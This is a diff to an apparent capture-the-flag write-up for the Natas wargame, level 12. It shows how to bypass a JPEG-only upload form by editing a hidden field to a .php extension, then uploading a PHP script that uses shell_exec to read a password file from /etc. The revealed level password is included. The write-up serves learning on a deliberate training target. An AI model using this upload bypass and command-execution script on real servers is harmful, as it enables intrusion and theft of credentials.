@@ -363,11 +363,25 @@ Choose a JPEG to upload (max 1KB):<br/>
 </body>
 </html>
 ```
-
+Functions used in the code:
 + pathinfo()-    The pathinfo() function returns information about a file path.
 https://www.w3schools.com/php/func_filesystem_pathinfo.asp
 + move_uploaded_file- https://www.w3schools.com/php/func_filesystem_move_uploaded_file.asp
-+ 
++ About hidden type in html:https://www.w3schools.com/tags/att_input_type_hidden.asp
+
+So, as we can see the page only accepts `.jpg` files. So, to read the password of level 13 we will write a php code and should make it run in the page. To change the file type, modify the hidden input field for filename,so that it displays a php file extension instead of jpg.
+For that we run the following code in the console,<br>
+`$( 'input[name="filename"]').val("test.php")` and press enter<br>
+Then in a file named `natas13.php` write the following code to access the password of level 13.<br>
+```
+<?php
+$password = shell_exec("cat /etc/natas_webpass/natas13");
+echo "<pre>$password</pre>"
+?>
+```
+Here, shell_exec() is used to execute command via shell and return the complete output as a string.<br>
+When we upload the file `natas13.php`, click on the link to your file so the webserver executes the script you wrote. Then we could find our password.<br>
+`The password for natas13: jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY`
   
 
 
